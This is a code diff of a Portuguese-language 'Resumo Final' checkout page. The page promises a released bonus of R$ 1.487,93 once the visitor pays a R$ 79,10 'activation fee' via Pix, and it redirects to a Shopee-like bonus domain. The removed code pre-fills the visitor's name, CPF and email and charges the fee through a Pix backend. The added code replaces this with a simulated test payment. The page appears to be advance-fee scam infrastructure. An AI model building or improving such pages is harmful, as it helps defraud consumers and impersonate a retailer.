@@ -3,40 +3,113 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Resumo Final</title>
+<title>Resumo Final - TESTE</title>
 
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
-body{background:#f7f7f7;padding:20px;display:flex;justify-content:center}
-.container{background:#fff;width:100%;max-width:420px;border-radius:15px;
-box-shadow:0 4px 20px rgba(0,0,0,0.08);overflow:hidden;border:1px solid #eee}
-.header{padding:20px;display:flex;justify-content:space-between;
-align-items:center;border-bottom:1px solid #f0f0f0}
-.balance-pill{background:#000;color:#fff;padding:5px 12px;
-border-radius:20px;font-size:14px;font-weight:bold}
-.alert-box{background:#fff5f2;border-left:4px solid #ee4d2d;
-margin:15px;padding:15px;border-radius:4px}
-.section-title{font-size:14px;font-weight:bold;color:#444;
-margin:20px 15px 10px;text-transform:uppercase}
-.data-card{background:#f9f9f9;margin:0 15px;padding:15px;
-border-radius:8px;border:1px solid #eee}
-.input-group{margin-bottom:12px}
-.input-group label{font-size:11px;font-weight:bold;color:#888;display:block}
-.input-readonly{width:100%;border:none;background:transparent;
-font-size:15px;color:#333;outline:none}
-.values-card{margin:20px 15px;border-top:1px solid #eee;padding-top:15px}
-.value-row{display:flex;justify-content:space-between;margin-bottom:8px}
-.value-row.total{margin-top:15px;padding-top:10px;
-border-top:1px solid #f0f0f0;color:#ee4d2d;font-weight:bold;font-size:18px}
-.cta-btn{width:calc(100% - 30px);margin:20px 15px;background:#ee4d2d;
-color:#fff;border:none;padding:18px;border-radius:8px;
-font-size:16px;font-weight:bold;cursor:pointer}
-#pix_area{display:none;text-align:center;padding:20px}
-#pix_area img{width:200px;margin-bottom:15px}
-#area_sucesso{display:none;text-align:center;padding:20px}
-.sucesso-btn{background:#1f9c6b;color:#fff;border:none;
-padding:15px 25px;border-radius:8px;font-weight:bold;
-cursor:pointer;margin-top:15px}
+* { margin:0; padding:0; box-sizing:border-box; font-family:Arial, sans-serif; }
+
+body {
+    background:#f7f7f7;
+    padding:20px;
+    display:flex;
+    justify-content:center;
+}
+
+.container {
+    background:#fff;
+    width:100%;
+    max-width:420px;
+    border-radius:15px;
+    box-shadow:0 4px 20px rgba(0,0,0,0.08);
+    overflow:hidden;
+    border:1px solid #eee;
+}
+
+.header {
+    padding:20px;
+    display:flex;
+    justify-content:space-between;
+    border-bottom:1px solid #f0f0f0;
+}
+
+.header h1 { font-size:18px; }
+
+.balance-pill {
+    background:#000;
+    color:#fff;
+    padding:5px 12px;
+    border-radius:20px;
+    font-size:14px;
+    font-weight:bold;
+}
+
+.section {
+    padding:20px;
+}
+
+.cta-btn {
+    width:100%;
+    background:#ee4d2d;
+    color:#fff;
+    border:none;
+    padding:18px;
+    border-radius:8px;
+    font-size:16px;
+    font-weight:bold;
+    cursor:pointer;
+    margin-top:15px;
+}
+
+.test-btn {
+    width:100%;
+    background:#999;
+    color:#fff;
+    border:none;
+    padding:14px;
+    border-radius:8px;
+    font-size:14px;
+    cursor:pointer;
+    margin-top:10px;
+}
+
+#pix_area {
+    display:none;
+    text-align:center;
+    padding:20px;
+}
+
+#pix_area img {
+    width:200px;
+    margin-bottom:15px;
+}
+
+#sucesso_area {
+    display:none;
+    text-align:center;
+    padding:30px;
+    animation: fadeIn 0.5s ease-in-out;
+}
+
+#sucesso_area h2 {
+    color:#1f9c6b;
+    margin-bottom:15px;
+}
+
+.success-btn {
+    background:#1f9c6b;
+    color:#fff;
+    border:none;
+    padding:16px 25px;
+    border-radius:8px;
+    font-weight:bold;
+    cursor:pointer;
+    font-size:15px;
+}
+
+@keyframes fadeIn {
+    from { opacity:0; transform:scale(0.95); }
+    to { opacity:1; transform:scale(1); }
+}
 </style>
 </head>
 
@@ -44,121 +117,64 @@ cursor:pointer;margin-top:15px}
 
 <div class="container">
 
-<div class="header">
-<h1>Resumo Final</h1>
-<div class="balance-pill">R$ 1.487,93</div>
-</div>
+    <div class="header">
+        <h1>Resumo Final</h1>
+        <div class="balance-pill">R$ 1.487,93</div>
+    </div>
 
-<div class="alert-box">
-<h2>Consolidação de valores</h2>
-<p>Confirme seus dados abaixo para liberar sua bonificação.</p>
-</div>
+    <div class="section">
 
-<div class="section-title">Seus Dados</div>
+        <p style="font-size:14px; margin-bottom:10px;">
+            Clique abaixo para gerar o QR Code.
+        </p>
 
-<div class="data-card">
-<div class="input-group">
-<label>NOME</label>
-<input type="text" id="nome" class="input-readonly" readonly>
-</div>
-<div class="input-group">
-<label>CPF</label>
-<input type="text" id="cpf" class="input-readonly" readonly>
-</div>
-<div class="input-group">
-<label>E-MAIL</label>
-<input type="text" id="email" class="input-readonly" readonly>
-</div>
-</div>
+        <button class="cta-btn" onclick="gerarPixTeste()">
+            PROSSEGUIR PARA PAGAMENTO
+        </button>
 
-<div class="values-card">
-<div class="value-row">
-<span>Taxa de Ativação</span>
-<strong>R$ 79,10</strong>
-</div>
-<div class="value-row total">
-<span>VALOR TOTAL LIBERADO</span>
-<strong>R$ 1.487,93</strong>
-</div>
-</div>
+        <!-- ÁREA QR -->
+        <div id="pix_area">
+            <h3 style="color:#1f9c6b; margin-bottom:10px;">
+                ✅ QR CODE GERADO
+            </h3>
 
-<div id="pix_area">
-<h3 style="color:#1f9c6b;margin-bottom:10px">QR Code Gerado</h3>
-<img id="qr_img">
-<p id="status_pagamento">Aguardando pagamento...</p>
-</div>
+            <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TESTE_PIX">
 
-<div id="area_sucesso">
-<h3 style="color:#1f9c6b">Pagamento Confirmado ✅</h3>
-<button class="sucesso-btn" onclick="abrirBonus()">
-ACESSAR SEU BÔNUS
-</button>
-</div>
+            <p style="font-size:12px; color:#777;">
+                (Modo teste - QR ilustrativo)
+            </p>
 
-<button class="cta-btn" id="btn_pagar" onclick="gerarPixFinal()">
-PROSSEGUIR PARA PAGAMENTO
-</button>
+            <button class="test-btn" onclick="simularPagamento()">
+                🔓 Simular Confirmação (TESTE)
+            </button>
+        </div>
+
+        <!-- ÁREA SUCESSO -->
+        <div id="sucesso_area">
+            <h2>🎉 Pagamento Confirmado</h2>
+
+            <button class="success-btn" onclick="abrirBonus()">
+                ACESSAR SEU BÔNUS
+            </button>
+        </div>
+
+    </div>
 
 </div>
 
 <script>
 
-const MODO_TESTE = true;
-const BASE_URL = "https://checkout-pix-profissional.onrender.com";
-
-function carregarDados(){
-const urlParams=new URLSearchParams(window.location.search);
-document.getElementById('nome').value=urlParams.get('nome')||"Não informado";
-document.getElementById('cpf').value=urlParams.get('cpf')||"Não informado";
-document.getElementById('email').value=urlParams.get('email')||"Não informado";
+function gerarPixTeste(){
+    document.getElementById("pix_area").style.display = "block";
 }
-window.onload=carregarDados;
 
-function gerarPixFinal(){
-
-const btn=document.getElementById('btn_pagar');
-btn.innerText="GERANDO PIX...";
-btn.disabled=true;
-
-const endpointPix=MODO_TESTE?"/pix-teste":"/pix";
-const endpointStatus=MODO_TESTE?"/check-status-teste/":"/check-status/";
-
-fetch(BASE_URL+endpointPix,{
-method:"POST",
-headers:{"Content-Type":"application/json"},
-body:JSON.stringify({valor:"79.10"})
-})
-.then(res=>res.json())
-.then(data=>{
-if(data.success){
-
-document.getElementById('pix_area').style.display="block";
-document.getElementById('qr_img').src=
-data.encodedImage.startsWith('http')
-?data.encodedImage
-:`data:image/png;base64,${data.encodedImage}`;
-
-btn.style.display="none";
-
-if(data.transactionId){
-const intervalo=setInterval(()=>{
-fetch(BASE_URL+endpointStatus+data.transactionId)
-.then(r=>r.json())
-.then(st=>{
-if(st.paid){
-clearInterval(intervalo);
-document.getElementById('pix_area').style.display="none";
-document.getElementById('area_sucesso').style.display="block";
-}
-});
-},3000);
-}
-}
-});
+function simularPagamento(){
+    document.getElementById("pix_area").style.display = "none";
+    document.getElementById("sucesso_area").style.display = "block";
 }
 
 function abrirBonus(){
-window.location.href="https://recuperabonushopp.com/elementor-1700";
+    window.location.href = "https://recuperabonushopp.com/elementor-1700";
 }
 
 </script>
